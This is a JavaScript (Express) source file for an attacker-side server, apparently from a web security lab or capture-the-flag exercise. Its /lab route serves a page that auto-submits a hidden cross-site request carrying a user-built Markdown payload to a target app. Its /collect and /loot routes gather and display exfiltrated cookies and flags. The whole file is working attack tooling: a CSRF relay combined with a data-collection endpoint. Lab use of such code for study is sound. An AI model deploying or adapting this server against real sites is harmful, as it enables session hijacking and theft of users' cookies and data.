const express = require("express");

const app = express();
const port = Number(process.env.PORT || 4000);
const loot = [];

app.use(express.text({ type: "*/*", limit: "1mb" }));

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function escapeAttribute(value) {
  return escapeHtml(value).replaceAll("\n", "&#10;").replaceAll("\r", "&#13;");
}

function firstQueryValue(value) {
  if (Array.isArray(value)) {
    return value[0];
  }
  return value;
}

function labFormPage(message = "") {
  const escapedMessage = message ? `<p>${escapeHtml(message)}</p>` : "";
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Payload Host</title>
</head>
<body>
  <h1>Payload Host</h1>
  ${escapedMessage}
  <p>This page only relays a supplied Markdown greeting through CSRF when the greeting query is present.</p>
  <form id="builder">
    <p><label>greeting <textarea name="greeting" rows="6" cols="80"></textarea></label></p>
    <p><label>report URL <input id="report-url" size="100" readonly></label></p>
    <button type="button" id="build">Build report URL</button>
  </form>
  <p><a href="/loot">/loot</a></p>
  <script>
    document.getElementById("build").addEventListener("click", () => {
      const greeting = document.querySelector("[name=greeting]").value;
      document.getElementById("report-url").value = location.origin + "/lab?greeting=" + encodeURIComponent(greeting);
    });
  </script>
</body>
</html>`;
}

app.get("/lab", (req, res) => {
  const greeting = firstQueryValue(req.query.greeting);

  if (!greeting) {
    res.type("html").send(labFormPage("Missing greeting. Build your own Markdown payload first."));
    return;
  }

  if (String(greeting).length > 6000) {
    res.status(400).type("text/plain").send("greeting too long");
    return;
  }

  const appOrigin = req.hostname === "attacker.security-lab.test"
    ? "http://app.security-lab.test:3000"
    : "http://app:3000";

  res.type("html").send(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Lab</title>
</head>
<body>
  <form id="csrf" method="post" action="${appOrigin}/help/search">
    <input type="hidden" name="query" value="test">
    <input type="hidden" name="greeting" value="${escapeAttribute(greeting)}">
  </form>
  <script>
    document.getElementById("csrf").submit();
  </script>
</body>
</html>`);
});

app.post("/collect", (req, res) => {
  const body = typeof req.body === "string" ? req.body : JSON.stringify(req.body);
  loot.push({
    at: new Date().toISOString(),
    body
  });
  res.type("text/plain").send("ok");
});

app.get("/loot", (req, res) => {
  if (loot.length === 0) {
    res.type("text/plain").send("no loot");
    return;
  }

  const lines = [];
  for (const item of loot) {
    lines.push(`# ${item.at}`);
    try {
      const parsed = JSON.parse(item.body);
      if (parsed.cookie) {
        lines.push(parsed.cookie);
      }
      if (parsed.flag) {
        lines.push(`flag=${parsed.flag}`);
      }
      lines.push(JSON.stringify(parsed, null, 2));
    } catch {
      lines.push(item.body);
    }
    lines.push("");
  }

  res.type("text/plain").send(lines.join("\n"));
});

app.listen(port, () => {
  console.log(`attacker listening on ${port}`);
});
